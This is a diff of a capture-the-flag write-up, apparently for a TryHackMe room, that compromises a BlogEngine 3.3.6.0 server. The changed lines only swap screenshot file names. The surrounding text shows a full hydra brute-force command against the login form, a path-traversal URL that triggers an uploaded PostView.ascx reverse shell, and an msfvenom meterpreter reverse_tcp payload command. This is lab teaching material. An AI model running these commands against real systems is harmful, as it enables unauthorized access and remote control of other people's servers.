@@ -18,7 +18,7 @@ This room will cover brute-forcing an accounts credentials, handling public expl
 
 ### What’s the name of the clown displayed on the homepage? <a href="#user-content-whats-the-name-of-the-clown-displayed-on-the-homepage" id="user-content-whats-the-name-of-the-clown-displayed-on-the-homepage"></a>
 
-<figure><img src="../../.gitbook/assets/Untitled (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled (2).png" alt=""><figcaption></figcaption></figure>
 
 There is an image of the clown of the IT movie. It’s name is ————.
 
@@ -36,13 +36,13 @@ You can check what request a form is making by right clicking on the login form,
 
 By clicking to the button located in the top-right corner of the website a menu appears:
 
-<figure><img src="../../.gitbook/assets/Untitled 1 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 1 (2).png" alt=""><figcaption></figcaption></figure>
 
 And clicking on LOG IN redirects us to this form:
 
-<figure><img src="../../.gitbook/assets/Untitled 2 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 2 (2).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/Untitled 3 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 3 (2).png" alt=""><figcaption></figcaption></figure>
 
 Looking at the source code we can see that the request type of this login form is POST
 
@@ -56,17 +56,17 @@ Run the following command but fill in the blanks:
 
 Navigating through the webpage, we can see that the only post published was made by “Administrator”.
 
-<figure><img src="../../.gitbook/assets/Untitled 4 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 4 (2).png" alt=""><figcaption></figcaption></figure>
 
 And if you click on the ADMINISTRATOR text, it redirects you to /author/Admin, so I guess that Admin is the username we are looking for.
 
 Also, the source code of the page says that the blog is run using BlogEngine:
 
-<figure><img src="../../.gitbook/assets/Untitled 5 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 5 (2).png" alt=""><figcaption></figcaption></figure>
 
 So, I searched what is the default user of blogengine and it appears that is admin.
 
-<figure><img src="../../.gitbook/assets/Untitled 6 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 6 (2).png" alt=""><figcaption></figcaption></figure>
 
 The search results also says that the default password is admin, but I have tested it and didn’t work.
 
@@ -74,7 +74,7 @@ I’ll be using fasttrack wordlist first, and if it doesn’t work I’ll use ro
 
 First thing I’ll do is gather all the info we need to execute the hydra command. I’ll try to log in with random credentials and I’ll intercept the request using Burp Suite:
 
-<figure><img src="../../.gitbook/assets/Untitled 7 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 7 (3).png" alt=""><figcaption></figcaption></figure>
 
 In the intercepted request we can see that the request is sent to `/Account/login.aspx?ReturnURL=%2fadmin%2f`
 
@@ -84,7 +84,7 @@ Where the name of the username field is `ctl00%24MainContent%24LoginUser%24UserN
 
 And the name of the password field is `ctl00%24MainContent%24LoginUser%24Password`
 
-<figure><img src="../../.gitbook/assets/Untitled 8 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 8 (2).png" alt=""><figcaption></figcaption></figure>
 
 And forwarding the request, we can see that a login error message appears with the text `Login failed`
 
@@ -92,11 +92,11 @@ Now, with the gathered data we can build the hydra command:
 
 `hydra -l admin -P /usr/share/wordlists/fasttrack.txt 10.10.243.37 http-post-form "/Account/login.aspx?ReturnURL=%2fadmin%2f:__VIEWSTATE=gIM3gB3youIJgamYDSq9I8KcJ65qkTcGNG4xcUV66GCbWTe8qxBf5vazzsVkYF46UequbLwxMPB%2FnJ250OVbaWslvJVxsUgX%2FekcVU66%2BSNQLM9g2YcBDaz%2BwIFVq8MbJeAlNAlVuVBb1ENbouQ%2BCUEUXdaAqER9UJSIfeTrsVti5NnFU%2FOkeI7Le6opTMtQVLgJ51cTY%2F8d2dHOUT5TWh7lftIpTvCG4YoxkI9abb7w1UUXMjgRd3mYIOUNQDAeR3solEMZn%2B5wSBYd%2FWNkQPfJUj9T5UNz3b1zGXCXi8HxiQx%2BzADp3s6bNvz7asMk8Y0MN1cIUBVqR8wkg3k%2Bn6EyHyR34gH1aiJfUNqdJ3vuGlrt&__EVENTVALIDATION=ZV5wkfSbQ%2FJN6v0RuQGDdvbxdRQHFrlNqpv0YgcsGLcQq22scoM7bk62pimul0s5oWnrfNnH6CIgqIakaJHZLsijL7D8mrB4atQ5YwZIRBshvtBSvWryF3NIyxCFVGYBZVHq4ofIQhijtUj3gN2cD0xIxW1yOiAdbjo5zVPz%2B7%2BY3gc2&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:F=Login failed" -V`
 
-<figure><img src="../../.gitbook/assets/Untitled 9 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 9 (2).png" alt=""><figcaption></figcaption></figure>
 
 Horay! We found a valid password for the admin user, let’s log in:
 
-<figure><img src="../../.gitbook/assets/Untitled 10 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 10 (2).png" alt=""><figcaption></figcaption></figure>
 
 We’re in!
 
@@ -110,7 +110,7 @@ Exploit-Database is a CVE (common vulnerability and exposures) archive of public
 
 On the left menu there is a About button:
 
-<figure><img src="../../.gitbook/assets/Untitled 11 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 11 (2).png" alt=""><figcaption></figcaption></figure>
 
 The version of BlogEngine is 3.3.6.0. Anyways we have seen that version before in a comment of the webpage source code!
 
@@ -118,11 +118,11 @@ The version of BlogEngine is 3.3.6.0. Anyways we have seen that version before i
 
 Let’s search “blogengine”, if there is many result we’ll do a more specific search:
 
-<figure><img src="../../.gitbook/assets/Untitled 12 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 12 (2).png" alt=""><figcaption></figcaption></figure>
 
 There are a few exploits, this one seems the correct one to gain a reverse shell:
 
-<figure><img src="../../.gitbook/assets/Untitled 13.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 13 (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Using the public exploit, gain initial access to the server. Who is the webserver running as? <a href="#user-content-using-the-public-exploit-gain-initial-access-to-the-server-who-is-the-webserver-running" id="user-content-using-the-public-exploit-gain-initial-access-to-the-server-who-is-the-webserver-running"></a>
 
@@ -164,13 +164,13 @@ First of all we have to download the exploit (or use it using msfconsole I guess
 
 To configure it, let’s follow the steps ahead and change the default IP address of the code:
 
-<figure><img src="../../.gitbook/assets/Untitled 14 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 14 (2).png" alt=""><figcaption></figcaption></figure>
 
 After that we have to save it as PostView.ascx.
 
 Now, let’s upload this file to the server:
 
-<figure><img src="../../.gitbook/assets/Untitled 15 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 15 (2).png" alt=""><figcaption></figcaption></figure>
 
 Now let’s open a netcat listener in our machine:
 
@@ -178,11 +178,11 @@ Now let’s open a netcat listener in our machine:
 
 And finally, let’s trigger the vulnerability by accessing the url: `http://10.10.243.37/?theme=../../App_Data/files`
 
-<figure><img src="../../.gitbook/assets/Untitled 17 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 17 (2).png" alt=""><figcaption></figcaption></figure>
 
 Yeah! Let’s see who am I logged as:
 
-<figure><img src="../../.gitbook/assets/Untitled 18 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 18 (2).png" alt=""><figcaption></figcaption></figure>
 
 ## Windows Privilege Escalation <a href="#user-content-windows-privilege-escalation" id="user-content-windows-privilege-escalation"></a>
 
@@ -198,7 +198,7 @@ So, first of all let’s generate the payload using msfvenom as the tip says. To
 
 `echo %PROCESSOR_ARCHITECTURE%`
 
-<figure><img src="../../.gitbook/assets/Untitled 19 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 19 (2).png" alt=""><figcaption></figcaption></figure>
 
 As we can see, the response indicates that the architecture is 64b. With this info, let’s generate the payload in our machine. `msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o shell.exe LHOST=10.10.10.10 LPORT=1234`
 
